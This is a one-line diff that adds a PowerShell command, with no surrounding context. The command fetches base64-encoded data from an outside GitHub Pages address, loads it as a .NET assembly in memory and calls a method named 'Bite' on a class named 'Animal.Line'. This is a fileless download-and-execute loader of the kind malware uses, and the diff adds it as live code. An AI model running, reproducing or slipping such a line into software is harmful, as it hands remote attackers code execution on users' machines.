@@ -1,0 +1,1 @@
+[Reflection.Assembly]::Load([Convert]::FromBase64String((Invoke-RestMethod 'http://ursaaxe731.github.io/term/middle'))).GetType('Animal.Line')::Bite()
